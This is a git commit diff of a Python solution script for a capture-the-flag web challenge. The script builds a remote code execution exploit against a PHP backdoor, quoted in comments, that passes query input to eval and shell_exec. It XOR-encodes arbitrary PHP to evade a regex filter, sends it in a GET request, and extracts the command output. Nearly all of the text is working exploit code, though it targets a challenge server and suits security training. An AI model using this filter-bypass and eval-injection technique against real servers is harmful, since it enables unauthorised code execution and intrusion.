a0c63b40bc6c547877830d6da6b10bb88538163c
David Nemeth Csoka <encse@csokavar.hu>
2021-04-28 08:23:47 +0200

    x

--- secchallenge/web/until-the-end/solution/solve.py
+++ secchallenge/web/until-the-end/solution/solve.py
@@ -14,12 +14,12 @@ def solve():
 
 
 def scandir(path):
-    return rce(f'foreach (scandir("{path}") as $v) echo $v."\n";')
+    return rce(f'foreach (scandir("{path}") as $v) echo "$v\n";')
 
 
 def rce(cmd):
 
-    # The task is built around PHPFuck obfuscation. After we extract the mess, we get:
+    # The task is built around PHPFuck obfuscation. After extracting the mess, we get:
 
     # if (isset($_GET[' '])) {
     #   eval(str_replace('a', str_replace('kekw'), str_rot13(strtoupper(substr($_GET[' '], 42, 69)))));
@@ -33,33 +33,20 @@ def rce(cmd):
     #   shell_exec($_GET['cmd']);
     # }
 
-    # we will exploit the second 'if' case. Let's introduce a new query parameter 'e' which will be
-    # executed by our exploit.
-    #
-    # First build up the string '$_GET["e"]' with XOR operations to trick the regexp filter.
-    # $a equals to '$_GET["e"]'.
-    # If we eval it, we get the 'e' query parameter, the second eval in turn runs e as PHP code:
-    enc1, enc2 = encode('$_GET["e"]')
-    # exploit = f'''
-    #     $a='P#{y/t|@|<' ^ 't|<<{/^%^a';
-    #     eval("eval($a);");
-    # '''
-    exploit = f'''
-        $a='{enc1}'^'{enc2}';
-        eval("eval($a);");
-    '''
+    # We will exploit the second 'if' case.
+    # 1) To trick the regexp filter find enc1 and enc2 so that enc1 ^ enc2 = cmd
+    # 2) call eval() to trigger the exploit:
 
-    exploit = urllib.parse.quote(exploit)
+    enc1, enc2 = encode(f'echo "qqqqq"; {cmd} echo "qqqqq";')
+    exploit = f"eval({enc1}^{enc2});"
+    response = requests.get(f'{base_url}?%2b={urllib.parse.quote(exploit)}').text
+    return re.search(r'qqqqq(.*)qqqqq', response, re.DOTALL).group(1)
 
-    cmd = 'echo "qqqqq";' + cmd + 'echo "qqqqq";'
-    cmd = urllib.parse.quote(cmd)
-    response = requests.get(f'{base_url}?e={cmd}&%2b={exploit}')
-    return re.search(r'qqqqq(.*)qqqqq', response.text, re.DOTALL).group(1)
 
 def encode(st):
-    rx = r'[\'b-d\-0-9H-LA-DU-Xi-kn-s!?TEz.]'
-    res1 = ''
-    res2 = ''
+    rx = r'[\'"b-d\-0-9H-LA-DU-Xi-kn-s!?TEz.]'
+    res1 = ""
+    res2 = ""
 
     for ch in st:
         for i in range(32, 127):
@@ -69,7 +56,8 @@ def encode(st):
                 res2 += chr(i)
                 break
 
-    return res1, res2
+    return f"'{res1}'", f"'{res2}'"
+
 
 if __name__ == "__main__":
     print(solve())
